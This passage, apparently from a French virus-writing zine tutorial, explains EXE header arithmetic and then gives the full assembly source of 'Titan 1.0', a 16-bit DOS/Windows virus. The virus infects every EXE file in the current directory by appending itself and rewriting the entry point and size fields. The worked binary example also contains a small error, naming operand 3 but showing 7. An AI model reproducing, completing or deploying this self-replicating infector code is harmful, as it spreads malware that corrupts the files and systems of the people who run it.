+On sait que par 13 modulo 4 est égale à 1. Maintenant représentons ces nombres en binaires
+13 -> 00001101
+Et vu que l'on veut calculer le modulo de 13 par rapport à 4, notre 2eme opérande sera donc 4-1,
+c'est à dire 3.
+3  -> 00000011
+Aussi avec un and les différentes combinaisons sont:
+0 and 0 = 0.
+0 and 1 = 0.
+1 and 0 = 0.
+1 and 1 = 1.
+Maintenant regardons cela de plus près.
+
+                       00001101
+                   and 00000111
+                   ------------
+                       00000001        
+
+On retrouve donc bien 1 en résultant, mais rappelez vous bien que cela ne fonctionne que lorsque
+l'on veut calculer le modulo de puissance de 2.
+Et le code:
+
+-----------------------------
+
+new_size:
+xor dx, dx
+mov ax, fin - debut                          ; ax = taille du virus
+mov bx, 200h                                 ; 200h = 512d
+div bx                                       ; divise ax par 512
+add  word ptr [bp+buffer_header+04],ax       ; ajoute le quotient de la division au nb de pages
+add  word ptr [bp+buffer_header+02],dx       ; ajoute le reste de la division  
+mov  dx, word ptr [bp+buffer_header+02]
+cmp  dx,200h                                 ; compare dx avec 512
+jb ttvabien                                  ; si inférieur on saute
+and  word ptr [bp+buffer_header+02],1FFh     ; on calcule le modulo (1ffh = 512d)
+inc  word ptr [bp+buffer_header+04]          ; on incrémente le nombre de pages 
+
+ttvabien: 
+ret                                          ; on se casse
+
+-----------------------------
+
+Voilà , on en a finit avec l'explication de l'infecteur en entier. Et désormais le code source.
+
+
+
+[ 3/ Code source:]
+
+
+-----------------------------------------------------------------------------------------------
+
+
+;Titan 1.0 par rikenar
+;Titan est qqchose de si délicieux à fumer :-)).
+;A pure titan
+;Titan est un exe infecteur de fichier 16 bits fonctionnant sous windows qui a pour fonction d'
+;infecter tous les fichiers du répertoire courant.
+
+
+.model tiny
+.radix 16
+.code
+
+org 100h
+
+debut:  
+
+push    ds                      
+push    cs cs                 
+pop     es ds  
+
+call delta
+
+delta:
+pop bp
+sub bp, offset delta
+
+
+ip:
+lea di, [ip_new + bp]
+lea si, [ip_old + bp]
+        movsw
+        movsw
+        movsw
+        movsw
+
+mtda:
+mov ah, 1ah
+lea dx, [bp + offset new_dta]
+int 21h
+
+mov ah, 4eh
+lea dx, [bp + exe_mask]
+sub cx, cx
+
+
+search:
+int 21h
+jc end
+mov ah, 3dh
+mov al, 02h
+lea dx, [bp+new_dta+1eh]
+int 21h
+
+mov bx, ax
+mov ax, 5700h
+int 21h
+push cx
+push dx 
+
+
+push bx
+mov ah, 3fh
+mov cx, 1ah
+lea dx, [bp + offset buffer_header]
+int 21h
+
+
+cmp word ptr [bp+buffer_header], 'ZM'
+jne close
+
+cmp word ptr [bp+buffer_header + 12], 'T'
+je close
+
+call save_header
+
+mov ah, 42h
+mov al, 02h
+xor cx, cx
+xor dx, dx
+int 21h
+
+call new_csip
+call new_size
+
+mov ah, 40h
+pop bx
+mov cx, fin - debut
+lea dx, [bp + debut]
+int 21h
+
+mov ah, 42h
+mov al, 00h
+xor cx, cx
+xor dx, dx
+int 21h
+
+mov ah, 40h
+mov cx, 1ah
+lea dx, [bp + buffer_header]
+int 21h
+
+jmp close2
+
+close:
+pop bx
+
+close2:
+
+pop dx
+pop cx
+mov ax, 5701h
+int 21h
+
+mov ah, 3eh
+int 21h
+
+mov ah, 4fh
+jmp  search
+
+end:
+pop  ds
+
+mov  dx,80
+mov  ah,1a
+int  21
+
+push    ds            
+pop     es
+mov     ax,es
+add     ax,10          
+add     word ptr cs:[cs_new+bp],ax 
+                                      
+cli
+add     ax,word ptr cs:[bp+ss_new]
+mov     ss,ax                       
+mov     sp,word ptr cs:[bp+sp_new]
+sti
+
+db      0ea    
+ip_new        dw      0
+cs_new        dw      0
+sp_new        dw      0
+ss_new        dw      0
+
+
+ip_old  dw      0
+cs_old  dw      0fff0           
+sp_old  dw      0              
+ss_old  dw      0fff0         
+
+
+
+save_header:
+mov  ax,word ptr [bp+buffer_header+0Eh]
+mov  word ptr [bp+ss_old],ax
+mov  ax,word ptr [bp+buffer_header+10]
+mov  word ptr [bp+sp_old],ax
+mov  ax,word ptr [bp+buffer_header+14]
+mov  word ptr [bp+ip_old],ax
+mov  ax,word ptr [bp+buffer_header+16]
+mov  word ptr [bp+cs_old],ax
+ret
+
+
+new_csip:
+
+
+mov     bx, word ptr [bp+buffer_header+8] 
+mov     cl, 0004h
+shl     bx, cl              
+sub     ax, bx                
+sbb     dx, 0000h          
+mov     cx, 0010h
+div     cx             
+mov     word ptr [bp+buffer_header+0Eh], ax 
+mov     word ptr [bp+buffer_header+14h], dx
+mov     word ptr [bp+buffer_header+12h], 'T' 
+mov     word ptr [bp+buffer_header+16h], ax 
+mov     word ptr [bp+buffer_header+10h],0FFFE
+ret
+     
+
+
+new_size:
+xor dx, dx
+mov ax, fin - debut
+mov bx, 200h
+div bx
+add  word ptr [bp+buffer_header+04],ax
+add  word ptr [bp+buffer_header+02],dx
+mov  dx, word ptr [bp+buffer_header+02]
+cmp  dx,200h
+jb ttvabien
+and  word ptr [bp+buffer_header+02],1FFh
+inc  word ptr [bp+buffer_header+04]
+
+ttvabien:
+ret
+
+
+
+exe_mask        db     '*.EXE',0
+fin:
+
+buffer_header   db      1a dup (?)
+new_dta:
+
+end debut
+
+
+
+-----------------------------------------------------------------------------------------------
+
+
+
+
+
+
+[ 4/ Conclusion:]
+
+Tout d'abord, pour ce qui est de l'infecteur, testez le dans un répertoire isolé, et aussi 
+testez le sur des fichiers 16 bits (et pas avec des fichiers win32). J'essairai surement plus 
+tard de faire un article sur les infecteurs de fichiers win32, si ça vous intéresse, faites 
+moi le savoir. Nous avons fini avec cette article, j'espère que je n'ai pas fait d'erreurs.
+Si c'est le cas, n'hésitez pas à me le dire. Pour toutes questions, remarques et critiques 
+écrivez moi à: rikenar.al@caramail.com. 
+Je souhaite remercier tous ceux qui ont pu m'aider pour l'élaboration de ce code, c'est à dire 
+en priorité kaze et EmperOr qui m'ont été d'un aide précieuse mais aussi Harl0ck. Et je 
+remercie aussi tous ceux du zine Ioc pour le zine qu'il faisait et tous les autres que je 
+connais pas mais qui essaie de faire bouger les choses. 
+Excusez moi pour les fautes.
+
+a+
+
+
+Documents utilisés:
+-Article de Lion7 dans ioc sur les exe infector.
+-Le guide de Billy Belcebù qui a été traduit par Androgyne.
+
+
+
+barbus.homeunix.org/rikenar
+
+
+
+               
+
+
+
+
+
